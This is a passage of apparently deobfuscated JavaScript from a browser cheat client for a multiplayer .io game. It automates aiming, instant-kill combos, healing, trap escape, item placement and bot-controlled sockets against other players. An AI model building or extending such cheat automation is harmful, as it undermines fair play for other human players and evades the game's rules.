  if (!player) {
    return 0;
  }
  if (!player.lockDir) {
    lastDir = Math.atan2(mouseY - screenHeight / 2, mouseX - screenWidth / 2);
  }
  return lastDir || 0;
}
let plusDir = 0;
let lastSpin = Date.now();
function getAttackDir() {
  if (player && Date.now() - lastSpin >= 235 && !clicks.right && !clicks.left) {
    plusDir += Math.random() * (Math.PI * 2);
    lastSpin = Date.now();
  }
  if (!player) {
    return "0";
  }
  if (my.autoAim || (clicks.left || useWasd && near.dist2 <= items.weapons[player.weapons[0]].range + near.scale * 1.8 && !traps.inTrap) && player.reloads[player.weapons[0]] == 0) {
    lastDir = getEl("weaponGrind").checked ? getSafeDir() : enemy.length ? near.aim2 : getSafeDir();
  } else if (clicks.right && player.reloads[player.weapons[1] == 10 ? player.weapons[1] : player.weapons[0]] == 0) {
    lastDir = getSafeDir();
  } else if (traps.inTrap) {
    lastDir = traps.aim;
  } else if (!player.lockDir) {
    if (!player.lockDir && autos.stopspin) {
      if (useWasd) {
        lastDir = lastDir;
      } else {
        lastDir = getSafeDir();
      }
    }
  }
  return lastDir;
}
function getVisualDir() {
  if (!player) {
    return 0;
  }
  lastDir = getSafeDir();
  return lastDir || 0;
}
function keysActive() {
  return allianceMenu.style.display != "block" && chatHolder.style.display != "block" && !menuCBFocus;
}
function toggleMenuChat() {
  if (menuChatDiv.style.display != "none") {
    let _0x37c5a2 = function (_0x256d80) {
      return {
        found: _0x256d80.startsWith("/") && commands[_0x256d80.slice(1).split(" ")[0]],
        fv: commands[_0x256d80.slice(1).split(" ")[0]]
      };
    };
    let _0x16d7cc = _0x37c5a2(menuChatBox.value);
    if (_0x16d7cc.found) {
      if (typeof _0x16d7cc.fv.action === "function") {
        _0x16d7cc.fv.action(menuChatBox.value);
      }
    } else {
      sendChat(menuChatBox.value);
    }
    menuChatBox.value = "";
    menuChatBox.blur();
  } else if (menuCBFocus) {
    menuChatBox.blur();
  } else {
    menuChatBox.focus();
  }
}
function keyDown(_0xfe4e32) {
  let _0x12d67d = _0xfe4e32.which || _0xfe4e32.keyCode || 0;
  if (player && player.alive && keysActive()) {
    if (!keys[_0x12d67d]) {
      keys[_0x12d67d] = 1;
      macro[_0xfe4e32.key] = 1;
      if (_0x12d67d == 27) {
        openMenu = !openMenu;
        $("#menuDiv").toggle();
        $("#menuChatDiv").toggle();
      } else if (_0x12d67d == 69) {
        sendAutoGather();
      } else if (_0x12d67d == 67) {
        updateMapMarker();
      } else if (player.weapons[_0x12d67d - 49] != undefined) {
        player.weaponCode = player.weapons[_0x12d67d - 49];
      } else if (moveKeys[_0x12d67d]) {
        sendMoveDir();
      } else if (_0xfe4e32.key == "m") {
        mills.placeSpawnPads = !mills.placeSpawnPads;
      } else if (_0xfe4e32.key == "z") {
        mills.place = !mills.place;
      } else if (_0xfe4e32.key == "Z") {
        if (typeof window.debug == "function") {
          window.debug();
        }
      } else if (_0x12d67d == 32) {
        packet("d", 1, getSafeDir(), 1);
        packet("d", 0, getSafeDir(), 1);
      } else if (_0xfe4e32.key == ",") {
        io.send("6", "*sneeze*");
        project.send(JSON.stringify(["tezt", "ratio"]));
        for (let _0x23cd40 = 0; _0x23cd40 < botz.length; _0x23cd40++) {
          botz[_0x23cd40][0].zync(near);
          console.log(botz[_0x23cd40][0]);
        }
      }
    }
  }
}
addEventListener("keydown", UTILS.checkTrusted(keyDown));
function keyUp(_0x39f954) {
  if (player && player.alive) {
    let _0x14fd51 = _0x39f954.which || _0x39f954.keyCode || 0;
    if (_0x14fd51 == 13) {
      toggleMenuChat();
    } else if (keysActive()) {
      if (keys[_0x14fd51]) {
        keys[_0x14fd51] = 0;
        macro[_0x39f954.key] = 0;
        if (moveKeys[_0x14fd51]) {
          sendMoveDir();
        } else if (_0x39f954.key == ",") {
          player.sync = false;
        } else if (_0x39f954.key == "X") {
          AC(document.getElementById("autochats").value);
        } else if (_0x39f954.key == "r") {
          rKeyPressed = !rKeyPressed;
        }
      }
    }
  }
}
window.addEventListener("keyup", UTILS.checkTrusted(keyUp));
function sendMoveDir() {
  if (found) {
    packet("a", undefined, 1);
  } else {
    let _0x39594a = getMoveDir();
    if (lastMoveDir == undefined || _0x39594a == undefined || Math.abs(_0x39594a - lastMoveDir) > 0.3) {
      if (!my.autoPush && !found) {
        packet("a", _0x39594a, 1);
      }
      lastMoveDir = _0x39594a;
    }
  }
}
function bindEvents() {}
bindEvents();
let isItemSetted = [];
function updateItemCountDisplay(_0x4ae750 = undefined) {
  for (let _0x3b346c = 3; _0x3b346c < items.list.length; ++_0x3b346c) {
    let _0x1a6292 = items.list[_0x3b346c].group.id;
    let _0x3bb1ab = items.weapons.length + _0x3b346c;
    if (!isItemSetted[_0x3bb1ab]) {
      isItemSetted[_0x3bb1ab] = document.createElement("div");
      isItemSetted[_0x3bb1ab].id = "itemCount" + _0x3bb1ab;
      getEl("actionBarItem" + _0x3bb1ab).appendChild(isItemSetted[_0x3bb1ab]);
      isItemSetted[_0x3bb1ab].style = "\n                        display: block;\n                        position: absolute;\n                        padding-left: 5px;\n                        font-size: 2em;\n                        color: #fff;\n                        ";
      isItemSetted[_0x3bb1ab].innerHTML = player.itemCounts[_0x1a6292] || 0;
    } else if (_0x4ae750 == _0x1a6292) {
      isItemSetted[_0x3bb1ab].innerHTML = player.itemCounts[_0x4ae750] || 0;
    }
  }
}
function autoPush() {
  let _0x11ea58 = liztobj.filter(_0x23be50 => _0x23be50.trap && _0x23be50.active && _0x23be50.isTeamObject(player) && UTILS.getDist(_0x23be50, near, 0, 2) <= near.scale + _0x23be50.getScale() + 5).sort(function (_0x3ad4a3, _0x11366c) {
    return UTILS.getDist(_0x3ad4a3, near, 0, 2) - UTILS.getDist(_0x11366c, near, 0, 2);
  })[0];
  if (_0x11ea58) {
    let _0x53b1db = liztobj.filter(_0x38fed8 => _0x38fed8.dmg && _0x38fed8.active && _0x38fed8.isTeamObject(player) && UTILS.getDist(_0x38fed8, _0x11ea58, 0, 0) <= near.scale + _0x11ea58.scale + _0x38fed8.scale).sort(function (_0x5e988f, _0x24c326) {
      return UTILS.getDist(_0x5e988f, near, 0, 2) - UTILS.getDist(_0x24c326, near, 0, 2);
    })[0];
    if (_0x53b1db) {
      let _0x234db4 = Math.atan2(near.y2 - _0x53b1db.y, near.x2 - _0x53b1db.x);
      my.autoPush = true;
      my.pushData = {
        x: _0x53b1db.x + Math.cos(_0x234db4),
        y: _0x53b1db.y + Math.sin(_0x234db4),
        x2: player.x2 + 30,
        y2: player.y2 + 30
      };
      let _0x4ad89e = {
        x: near.x2 + Math.cos(_0x234db4) * 30,
        y: near.y2 + Math.sin(_0x234db4) * 60
      };
      let _0x31e441 = Math.atan2(_0x4ad89e.y - player.y2, _0x4ad89e.x - player.x2);
      packet("a", _0x31e441, 1);
    } else if (my.autoPush) {
      my.autoPush = false;
      packet("a", lastMoveDir || undefined, 1);
    }
  } else if (my.autoPush) {
    my.autoPush = false;
    packet("a", lastMoveDir || undefined, 1);
  }
}
function addDeadPlayer(_0x23384c) {
  deadPlayers.push(new DeadPlayer(_0x23384c.x, _0x23384c.y, _0x23384c.dir, _0x23384c.buildIndex, _0x23384c.weaponIndex, _0x23384c.weaponVariant, _0x23384c.skinColor, _0x23384c.scale, _0x23384c.name));
}
function setInitData(_0x587665) {
  alliances = _0x587665.teams;
}
function setupGame(_0x4609ac) {
  keys = {};
  macro = {};
  playerSID = _0x4609ac;
  attackState = 0;
  inGame = true;
  packet("d", 0, getAttackDir(), 1);
  my.ageInsta = true;
  if (firstSetup) {
    firstSetup = false;
    gameObjects.length = 0;
    liztobj.length = 0;
  }
}
function addPlayer(_0x26d38a, _0x1532db) {
  let _0x36d409 = findPlayerByID(_0x26d38a[0]);
  if (!_0x36d409) {
    _0x36d409 = new Player(_0x26d38a[0], _0x26d38a[1], config, UTILS, projectileManager, objectManager, players, ais, items, hats, accessories);
    players.push(_0x36d409);
    if (_0x26d38a[1] != playerSID) {
      addMenuChText(null, "Found: [" + _0x26d38a[2] + "]", "yellow");
    }
  } else if (_0x26d38a[1] != playerSID) {
    addMenuChText(null, "Spotted: [" + _0x26d38a[2] + "]", "yellow");
  }
  _0x36d409.spawn(_0x1532db ? true : null);
  _0x36d409.visible = false;
  _0x36d409.oldPos = {
    x2: undefined,
    y2: undefined
  };
  _0x36d409.x2 = undefined;
  _0x36d409.y2 = undefined;
  _0x36d409.x3 = undefined;
  _0x36d409.y3 = undefined;
  _0x36d409.setData(_0x26d38a);
  if (_0x1532db) {
    if (!player) {
      window.prepareUI(_0x36d409);
    }
    player = _0x36d409;
    camX = player.x;
    camY = player.y;
    my.lastDir = 0;
    updateItems();
    updateAge();
    updateItemCountDisplay();
    for (let _0x4da522 = 0; _0x4da522 < 6; _0x4da522++) {
      petals.push(new Petal(player.x, player.y));
    }
    if (player.skins[7]) {
      my.reSync = true;
    }
  }
}
function removePlayer(_0x3e1da0) {
  for (let _0x3e1c37 = 0; _0x3e1c37 < players.length; _0x3e1c37++) {
    if (players[_0x3e1c37].id == _0x3e1da0) {
      addMenuChText("Game", players[_0x3e1c37].name + "[" + players[_0x3e1c37].sid + "] left the game", "white");
      players.splice(_0x3e1c37, 1);
      break;
    }
  }
}
function updateHealth(_0x24679f, _0x392a59) {
  tmpObj = findPlayerBySID(_0x24679f);
  let _0xd10595 = tmpObj;
  if (tmpObj) {
    tmpObj.oldHealth = tmpObj.health;
    tmpObj.health = _0x392a59;
    tmpObj.judgeShame();
    if (tmpObj.oldHealth > tmpObj.health) {
      tmpObj.damaged = tmpObj.oldHealth - tmpObj.health;
      advHeal.push([_0x24679f, _0x392a59, tmpObj.damaged]);
    }
    if (trackers[_0xd10595.id]) {
      trackers[_0xd10595.id].update(_0x392a59, _0xd10595.shameCount);
    } else {
      trackers[_0xd10595.id] = new healTracker(_0x392a59, _0xd10595.id, _0xd10595.shameCount);
    }
  }
}
function killPlayer() {
  petals = [];
  inGame = false;
  lastDeath = {
    x: player.x,
    y: player.y
  };
}
function updateItemCounts(_0x55875e, _0x2ef2be) {
  if (player) {
    player.itemCounts[_0x55875e] = _0x2ef2be;
    updateItemCountDisplay(_0x55875e);
  }
}
function updateAge(_0x407b5c, _0x512168, _0x1e2f88) {
  if (_0x407b5c != undefined) {
    player.XP = _0x407b5c;
  }
  if (_0x512168 != undefined) {
    player.maxXP = _0x512168;
  }
  if (_0x1e2f88 != undefined) {
    player.age = _0x1e2f88;
  }
}
function updateUpgrades(_0x307882, _0x164a33) {
  player.upgradePoints = _0x307882;
  player.upgrAge = _0x164a33;
  if (_0x307882 > 0) {
    tmpList.length = 0;
    UTILS.removeAllChildren(upgradeHolder);
    for (let _0x2a9720 = 0; _0x2a9720 < items.weapons.length; ++_0x2a9720) {
      if (items.weapons[_0x2a9720].age == _0x164a33 && (items.weapons[_0x2a9720].pre == undefined || player.weapons.indexOf(items.weapons[_0x2a9720].pre) >= 0)) {
        let _0xe892c9 = UTILS.generateElement({
          id: "upgradeItem" + _0x2a9720,
          class: "actionBarItem",
          onmouseout: function () {
            showItemInfo();
          },
          parent: upgradeHolder
        });
        _0xe892c9.style.backgroundImage = getEl("actionBarItem" + _0x2a9720).style.backgroundImage;
        tmpList.push(_0x2a9720);
      }
    }
    for (let _0x177df3 = 0; _0x177df3 < items.list.length; ++_0x177df3) {
      if (items.list[_0x177df3].age == _0x164a33 && (items.list[_0x177df3].pre == undefined || player.items.indexOf(items.list[_0x177df3].pre) >= 0)) {
        let _0x2ad55b = items.weapons.length + _0x177df3;
        let _0xb3795 = UTILS.generateElement({
          id: "upgradeItem" + _0x2ad55b,
          class: "actionBarItem",
          onmouseout: function () {
            showItemInfo();
          },
          parent: upgradeHolder
        });
        _0xb3795.style.backgroundImage = getEl("actionBarItem" + _0x2ad55b).style.backgroundImage;
        tmpList.push(_0x2ad55b);
      }
    }
    for (let _0x4e11a4 = 0; _0x4e11a4 < tmpList.length; _0x4e11a4++) {
      (function (_0x47b050) {
        let _0x453653 = getEl("upgradeItem" + _0x47b050);
        _0x453653.onclick = UTILS.checkTrusted(function () {
          packet("H", _0x47b050);
        });
        UTILS.hookTouchEvents(_0x453653);
      })(tmpList[_0x4e11a4]);
    }
    if (tmpList.length) {
      upgradeHolder.style.display = "block";
      upgradeCounter.style.display = "block";
      upgradeCounter.innerHTML = "SELECT ITEMS (" + _0x307882 + ")";
    } else {
      upgradeHolder.style.display = "none";
      upgradeCounter.style.display = "none";
      showItemInfo();
    }
  } else {
    upgradeHolder.style.display = "none";
    upgradeCounter.style.display = "none";
    showItemInfo();
  }
}
function killObject(_0x4dd374) {
  let _0x4f9c6c = findObjectBySid(_0x4dd374);
  objectManager.disableBySid(_0x4dd374);
  if (player) {
    for (let _0x2a42a3 = 0; _0x2a42a3 < breakObjects.length; _0x2a42a3++) {
      if (breakObjects[_0x2a42a3].sid == _0x4dd374) {
        breakObjects.splice(_0x2a42a3, 1);
        break;
      }
    }
    if (!player.canSee(_0x4f9c6c)) {
      breakTrackers.push({
        x: _0x4f9c6c.x,
        y: _0x4f9c6c.y
      });
    }
    if (breakTrackers.length > 8) {
      breakTrackers.shift();
    }
    traps.replacer(_0x4f9c6c);
  }
}
function numArr(_0x175a3d = 0, _0x47a5d5 = 1, _0x288456, _0xbf11e3 = 1) {
  let _0x2df900 = [];
  for (let _0x1b8bb8 = _0x175a3d; _0x1b8bb8 < _0x47a5d5; _0x1b8bb8 += _0xbf11e3) {
    _0x2df900.push(_0x1b8bb8);
    if (typeof _0x288456 == "function") {
      _0x288456(_0x1b8bb8);
    }
  }
  return _0x2df900;
}
function toR(_0x14e80a) {
  var _0x6c0d53 = _0x14e80a * Math.PI / 180 % (Math.PI * 2);
  if (_0x6c0d53 > Math.PI) {
    return Math.PI - _0x6c0d53;
  } else {
    return _0x6c0d53;
  }
}
function toD(_0x3de150) {
  var _0x4dc53e = _0x3de150 / Math.PI * 360 % 360;
  if (_0x4dc53e >= 360) {
    return _0x4dc53e - 360;
  } else {
    return _0x4dc53e;
  }
}
function fgdo(_0x541bb3, _0x34f681) {
  return Math.sqrt(Math.pow(_0x34f681.y - _0x541bb3.y, 2) + Math.pow(_0x34f681.x - _0x541bb3.x, 2));
}
function caf(_0x50ca05, _0x57090f) {
  try {
    return Math.atan2((_0x57090f.y2 || _0x57090f.y) - (_0x50ca05.y2 || _0x50ca05.y), (_0x57090f.x2 || _0x57090f.x) - (_0x50ca05.x2 || _0x50ca05.x));
  } catch (_0x5cade8) {
    return 0;
  }
}
function killObjects(_0x421016) {
  if (player) {
    objectManager.removeAllItems(_0x421016);
  }
}
function perfectReplace() {}
let ticks = {
  tick: 0,
  delay: 0,
  time: [],
  manage: []
};
function setTickout(_0x1cc4bb, _0x3d984f) {
  if (!ticks.manage[ticks.tick + _0x3d984f]) {
    ticks.manage[ticks.tick + _0x3d984f] = [_0x1cc4bb];
  } else {
    ticks.manage[ticks.tick + _0x3d984f].push(_0x1cc4bb);
  }
}
function doNextTick(_0x5ad77f) {
  waitTicks.push(_0x5ad77f);
}
let waitTicks = [];
let found = false;
let autoQ = false;
let autos = {
  insta: {
    todo: false,
    wait: false,
    count: 4,
    shame: 5
  },
  bull: false,
  antibull: 0,
  reloaded: false,
  stopspin: true
};
function updatePlayers(_0x392050) {
  function _0x10f773(_0x77cc2e, _0x5ebb20) {
    _0x77cc2e = _0x77cc2e % (Math.PI * 2);
    _0x5ebb20 = _0x5ebb20 % (Math.PI * 2);
    let _0x1478c6 = Math.abs(_0x77cc2e - _0x5ebb20);
    if (_0x1478c6 > Math.PI) {
      _0x1478c6 = Math.PI * 2 - _0x1478c6;
    }
    return _0x1478c6;
  }
  game.tick++;
  enemy = [];
  nears = [];
  near = [];
  game.tickSpeed = performance.now() - game.lastTick;
  game.lastTick = performance.now();
  players.forEach(_0x5657c4 => {
    _0x5657c4.forcePos = !_0x5657c4.visible;
    _0x5657c4.visible = false;
    if (_0x5657c4.timeHealed - _0x5657c4.timeDamaged > 0 && _0x5657c4.lastshamecount < _0x5657c4.shameCount) {
      _0x5657c4.pinge = _0x5657c4.timeHealed - _0x5657c4.timeDamaged;
    }
  });
  for (let _0x3b3ac5 = 0; _0x3b3ac5 < _0x392050.length;) {
    tmpObj = findPlayerBySID(_0x392050[_0x3b3ac5]);
    if (tmpObj) {
      tmpObj.t1 = tmpObj.t2 === undefined ? game.lastTick : tmpObj.t2;
      tmpObj.t2 = game.lastTick;
      tmpObj.oldPos.x2 = tmpObj.x2;
      tmpObj.oldPos.y2 = tmpObj.y2;
      tmpObj.x1 = tmpObj.x;
      tmpObj.y1 = tmpObj.y;
      tmpObj.x2 = _0x392050[_0x3b3ac5 + 1];
      tmpObj.y2 = _0x392050[_0x3b3ac5 + 2];
      tmpObj.x3 = tmpObj.x2 + (tmpObj.x2 - tmpObj.oldPos.x2);
      tmpObj.y3 = tmpObj.y2 + (tmpObj.y2 - tmpObj.oldPos.y2);
      tmpObj.d1 = tmpObj.d2 === undefined ? _0x392050[_0x3b3ac5 + 3] : tmpObj.d2;
      tmpObj.d2 = _0x392050[_0x3b3ac5 + 3];
      tmpObj.dt = 0;
      tmpObj.buildIndex = _0x392050[_0x3b3ac5 + 4];
      tmpObj.weaponIndex = _0x392050[_0x3b3ac5 + 5];
      tmpObj.weaponVariant = _0x392050[_0x3b3ac5 + 6];
      tmpObj.team = _0x392050[_0x3b3ac5 + 7];
      tmpObj.isLeader = _0x392050[_0x3b3ac5 + 8];
      tmpObj.oldSkinIndex = tmpObj.skinIndex;
      tmpObj.oldTailIndex = tmpObj.tailIndex;
      tmpObj.skinIndex = _0x392050[_0x3b3ac5 + 9];
      tmpObj.tailIndex = _0x392050[_0x3b3ac5 + 10];
      tmpObj.iconIndex = _0x392050[_0x3b3ac5 + 11];
      tmpObj.zIndex = _0x392050[_0x3b3ac5 + 12];
      tmpObj.visible = true;
      tmpObj.update(game.tickSpeed);
      tmpObj.dist2 = UTILS.getDist(tmpObj, player, 2, 2);
      tmpObj.aim2 = UTILS.getDirect(tmpObj, player, 2, 2);
      tmpObj.dist3 = UTILS.getDist(tmpObj, player, 3, 3);
      tmpObj.aim3 = UTILS.getDirect(tmpObj, player, 3, 3);
      tmpObj.damageThreat = 0;
      if (tmpObj.skinIndex == 45 && tmpObj.shameTimer <= 0) {
        tmpObj.addShameTimer();
      }
      if (tmpObj.oldSkinIndex == 45 && tmpObj.skinIndex != 45) {
        tmpObj.shameTimer = 0;
        tmpObj.shameCount = 0;
        if (tmpObj == player) {
          healer();
        }
      }
      botSkts.forEach(_0x281ae0 => {
        _0x281ae0.showName = "YEAHHH";
      });
      for (let _0x20c14a = 0; _0x20c14a < players.length; _0x20c14a++) {
        for (let _0x4e0b9f = 0; _0x4e0b9f < botSkts.length; _0x4e0b9f++) {
          if (player.id === _0x4e0b9f.id) {
            _0x4e0b9f.showName = "YEAHHHHHH";
          }
        }
      }
      if (configs.HighautoQ) {
        if (game.tickRate * (window.pingTime >= 280 ? 2 : 1)) {
          autoQ = true;
          healer();
        } else {
          if (autoQ) {
            healer();
          }
          autoQ = false;
        }
      }
      if (configs.WarnLag) {
        if (window.pingTime >= 300) {
          addMenuChText(null, "[LagSpike]: " + window.pingTime, "red");
        }
      }
      if (tmpObj == player) {
        if (liztobj.length) {
          liztobj.forEach(_0xcba89f => {
            _0xcba89f.onNear = false;
            if (_0xcba89f.active) {
              if (!_0xcba89f.onNear && UTILS.getDist(_0xcba89f, tmpObj, 0, 2) <= _0xcba89f.scale + items.weapons[tmpObj.weapons[0]].range) {
                _0xcba89f.onNear = true;
              }
              if (_0xcba89f.isItem && _0xcba89f.owner) {
                if (!_0xcba89f.pps && tmpObj.sid == _0xcba89f.owner.sid && UTILS.getDist(_0xcba89f, tmpObj, 0, 2) > (parseInt(getEl("breakRange").value) || 0) && !_0xcba89f.breakObj && ![13, 14, 20].includes(_0xcba89f.id)) {
                  _0xcba89f.breakObj = true;
                  breakObjects.push({
                    x: _0xcba89f.x,
                    y: _0xcba89f.y,
                    sid: _0xcba89f.sid
                  });
                }
              }
            }
          });
          let _0x1b4634 = liztobj.filter(_0x35df70 => _0x35df70.trap && _0x35df70.active && UTILS.getDist(_0x35df70, tmpObj, 0, 2) <= tmpObj.scale + _0x35df70.getScale() + 25 && !_0x35df70.isTeamObject(tmpObj)).sort(function (_0x2b924c, _0x27103e) {
            return UTILS.getDist(_0x2b924c, tmpObj, 0, 2) - UTILS.getDist(_0x27103e, tmpObj, 0, 2);
          })[0];
          if (_0x1b4634) {
            let _0xc52185 = gameObjects.filter(_0x4b6134 => _0x4b6134.dmg && cdf(tmpObj, _0x4b6134) <= tmpObj.scale + _0x1b4634.scale / 2 && !_0x4b6134.isTeamObject(tmpObj) && _0x4b6134.active)[0];
            traps.dist = UTILS.getDist(_0x1b4634, tmpObj, 0, 2);
            traps.aim = UTILS.getDirect(_0xc52185 ? _0xc52185 : _0x1b4634, tmpObj, 0, 2);
            traps.protect(caf(_0x1b4634, tmpObj) - Math.PI);
            traps.inTrap = true;
            traps.info = _0x1b4634;
          } else {
            traps.inTrap = false;
            traps.info = {};
          }
        } else {
          traps.inTrap = false;
        }
      }
      if (tmpObj.weaponIndex < 9) {
        tmpObj.primaryIndex = tmpObj.weaponIndex;
        tmpObj.primaryVariant = tmpObj.weaponVariant;
      } else if (tmpObj.weaponIndex > 8) {
        tmpObj.secondaryIndex = tmpObj.weaponIndex;
        tmpObj.secondaryVariant = tmpObj.weaponVariant;
      }
    }
    _0x3b3ac5 += 13;
  }
  if (textManager.stack.length) {
    let _0x135453 = 0;
    let _0x30f731 = 0;
    let _0x1ab38f = {
      x: null,
      y: null
    };
    let _0x2e935 = {
      x: null,
      y: null
    };
    textManager.stack.forEach(_0x5510d3 => {
      if (_0x5510d3.value >= 0) {
        if (_0x135453 == 0) {
          _0x1ab38f = {
            x: _0x5510d3.x,
            y: _0x5510d3.y
          };
        }
        _0x135453 += Math.abs(_0x5510d3.value);
      } else {
        if (_0x30f731 == 0) {
          _0x2e935 = {
            x: _0x5510d3.x,
            y: _0x5510d3.y
          };
        }
        _0x30f731 += Math.abs(_0x5510d3.value);
      }
    });
    if (_0x30f731 > 0) {
      textManager.showText(_0x2e935.x, _0x2e935.y, Math.max(45, Math.min(50, _0x30f731)), 0.18, 500, _0x30f731, "#8ecc51");
    }
    if (_0x135453 > 0) {
      textManager.showText(_0x1ab38f.x, _0x1ab38f.y, Math.max(45, Math.min(50, _0x135453)), 0.18, 500, _0x135453, "#fff");
    }
    textManager.stack = [];
  }
  if (runAtNextTick.length) {
    runAtNextTick.forEach(_0x5d80a6 => {
      checkProjectileHolder(..._0x5d80a6);
    });
    runAtNextTick = [];
  }
  for (let _0x19ab02 = 0; _0x19ab02 < _0x392050.length;) {
    tmpObj = findPlayerBySID(_0x392050[_0x19ab02]);
    if (tmpObj) {
      if (!tmpObj.isTeam(player)) {
        enemy.push(tmpObj);
        if (tmpObj.dist2 <= items.weapons[tmpObj.primaryIndex == undefined ? 5 : tmpObj.primaryIndex].range + player.scale * 2) {
          nears.push(tmpObj);
        }
      }
      tmpObj.manageReload();
      if (tmpObj != player) {
        tmpObj.addDamageThreat(player);
      }
    }
    _0x19ab02 += 13;
  }
  if (player && player.alive) {
    if (enemy.length) {
      near = enemy.sort(function (_0x291610, _0x3fc812) {
        return _0x291610.dist2 - _0x3fc812.dist2;
      })[0];
    } else {}
    if (game.tickQueue[game.tick]) {
      game.tickQueue[game.tick].forEach(_0x564d6b => {
        _0x564d6b();
      });
      game.tickQueue[game.tick] = null;
    }
    if (advHeal.length) {
      advHeal.forEach(_0x31cda7 => {
        let _0x389422 = _0x31cda7[0];
        let _0x315bab = _0x31cda7[1];
        let _0xe57f72 = 100 - _0x315bab;
        let _0x365365 = _0x31cda7[2];
        tmpObj = findPlayerBySID(_0x389422);
        let _0x497cb6 = false;
        if (tmpObj.health <= 0) {
          if (!tmpObj.death) {
            tmpObj.death = true;
            if (tmpObj != player) {
              if (tmpObj.skinIndex == 45) {
                addMenuChText("Game", tmpObj.name + "[" + tmpObj.sid + "] has died due to clown", "red");
              } else if (tmpObj.shameCount >= 5) {
                addMenuChText("Game", tmpObj.name + "[" + tmpObj.sid + "] has died due to high shame", "red");
              } else {
                addMenuChText("Game", tmpObj.name + "[" + tmpObj.sid + "] has died", "red");
              }
              textManager.showText(tmpObj.x, tmpObj.y, 20, 0.15, 1850, "", 2);
            }
            addDeadPlayer(tmpObj);
          }
        }
        if (tmpObj == player) {
          if (tmpObj.skinIndex == 7 && (_0x365365 == 5 || tmpObj.latestTail == 13 && _0x365365 == 2)) {
            if (my.reSync) {
              my.reSync = false;
              tmpObj.setBullTick = true;
            }
            _0x497cb6 = true;
          }
          if (inGame) {
            let _0x9dc55f = getAttacker(_0x365365);
            let _0x218031 = [0.25, 0.45].map(_0x240248 => _0x240248 * items.weapons[player.weapons[0]].dmg * soldierMult());
            let _0x2dae63 = !_0x497cb6 && _0x218031.includes(_0x365365);
            let _0x346913 = 80;
            let _0x815319 = function (_0x51a7d8) {
              setTimeout(() => {
                healer();
              }, _0x51a7d8);
            };
            if (_0x365365 >= (_0x2dae63 ? 8 : 20) && tmpObj.damageThreat >= 25 && game.tick - tmpObj.antiTimer > 1) {
              tmpObj.canEmpAnti = true;
              tmpObj.antiTimer = game.tick;
              let _0x4e425e = 6;
              if (tmpObj.shameCount < _0x4e425e) {
                healer();
              } else {
                _0x815319(_0x346913);
              }
            } else {
              _0x815319(_0x346913);
            }
            if (_0x365365 >= 20 && player.skinIndex == 11) {
              instaC.canCounter = true;
            }
          }
        } else if (!tmpObj.setPoisonTick && (tmpObj.damaged == 5 || tmpObj.latestTail == 13 && tmpObj.damaged == 2)) {
          tmpObj.setPoisonTick = true;
        }
      });
      advHeal = [];
    }
    players.forEach(_0x1a1c28 => {
      if (!_0x1a1c28.visible && player != _0x1a1c28) {
        _0x1a1c28.reloads = {
          0: 0,
          1: 0,
          2: 0,
          3: 0,
          4: 0,
          5: 0,
          6: 0,
          7: 0,
          8: 0,
          9: 0,
          10: 0,
          11: 0,
          12: 0,
          13: 0,
          14: 0,
          15: 0,
          53: 0
        };
      }
      if (_0x1a1c28.setBullTick) {
        _0x1a1c28.bullTimer = 0;
      }
      if (_0x1a1c28.setPoisonTick) {
        _0x1a1c28.poisonTimer = 0;
      }
      _0x1a1c28.updateTimer();
    });
    if (inGame) {
      if (enemy.length) {
        if (player.canEmpAnti) {
          player.canEmpAnti = false;
          if (near.dist2 <= 300 && !my.safePrimary(near) && !my.safeSecondary(near)) {
            if (near.reloads[53] == 0) {
              player.empAnti = true;
              player.soldierAnti = false;
            } else {
              player.empAnti = false;
              player.soldierAnti = true;
            }
          }
        }
        let _0x265716 = liztobj.filter(_0x462eca => _0x462eca.dmg && _0x462eca.active && _0x462eca.isTeamObject(player) && UTILS.getDist(_0x462eca, near, 0, 3) <= _0x462eca.scale + near.scale).sort(function (_0x2fe496, _0x1a87fb) {
          return UTILS.getDist(_0x2fe496, near, 0, 2) - UTILS.getDist(_0x1a87fb, near, 0, 2);
        })[0];
        if (_0x265716) {
          if (near.dist3 <= items.weapons[player.weapons[0]].range + player.scale * 1.8 && configs.predictTick) {
            instaC.canSpikeTick = true;
            instaC.syncHit = true;
            if (configs.revTick && player.weapons[1] == 15 && player.reloads[53] == 0 && instaC.perfCheck(player, near)) {
              instaC.revTick = true;
            }
          }
        }
        let _0x6c3c69 = liztobj.filter(_0x3e595e => _0x3e595e.dmg && _0x3e595e.active && !_0x3e595e.isTeamObject(player) && UTILS.getDist(_0x3e595e, player, 0, 3) < _0x3e595e.scale + player.scale).sort(function (_0x419fb9, _0x4af831) {
          return UTILS.getDist(_0x419fb9, player, 0, 2) - UTILS.getDist(_0x4af831, player, 0, 2);
        })[0];
        if (_0x6c3c69 && !traps.inTrap) {
          if (near.dist3 <= items.weapons[5].range + near.scale * 1.8) {
            my.anti0Tick = 1;
          }
        }
      }
      if ((useWasd ? true : (player.checkCanInsta(true) >= 100 ? player.checkCanInsta(true) : player.checkCanInsta(false)) >= (player.weapons[1] == 10 ? 95 : 100)) && near.dist2 <= items.weapons[player.weapons[1] == 10 ? player.weapons[1] : player.weapons[0]].range + near.scale * 1.8 && (instaC.wait || useWasd && Math.floor(Math.random() * 5) == 0) && !instaC.isTrue && !my.waitHit && player.reloads[player.weapons[0]] == 0 && player.reloads[player.weapons[1]] == 0 && (useWasd ? true : getEl("instaType").value == "oneShot" ? player.reloads[53] <= (player.weapons[1] == 10 ? 0 : game.tickRate) : true) && instaC.perfCheck(player, near)) {
        if (player.checkCanInsta(true) >= 100) {
          instaC.nobull = useWasd ? false : instaC.canSpikeTick ? false : true;
        } else {
          instaC.nobull = false;
        }
        instaC.can = true;
      } else {
        instaC.can = false;
      }
      if (macro.q) {
        place(0, getAttackDir());
      }
      if (macro.f) {
        place(4, getSafeDir());
      }
      if (macro.v) {
        place(2, getSafeDir());
      }
      if (macro.y) {
        place(5, getSafeDir());
      }
      if (macro.h) {
        place(player.getItemType(22), getSafeDir());
      }
      if (macro.n) {
        place(3, getSafeDir());
      }
      if (game.tick % 1 == 0) {
        if (mills.place) {
          let _0x553f25 = 7.7;
          for (let _0x37b411 = -_0x553f25; _0x37b411 <= _0x553f25; _0x37b411 += _0x553f25) {
            checkPlace(3, UTILS.getDirect(player.oldPos, player, 2, 2) + _0x37b411);
          }
        } else if (mills.placeSpawnPads) {
          for (let _0x227154 = 0; _0x227154 < Math.PI * 2; _0x227154 += Math.PI / 2) {
            checkPlace(player.getItemType(20), UTILS.getDirect(player.oldPos, player, 2, 2) + _0x227154);
          }
        }
      }
      if (instaC.can) {
        instaC.changeType(player.weapons[1] == 10 ? "rev" : "normal");
      }
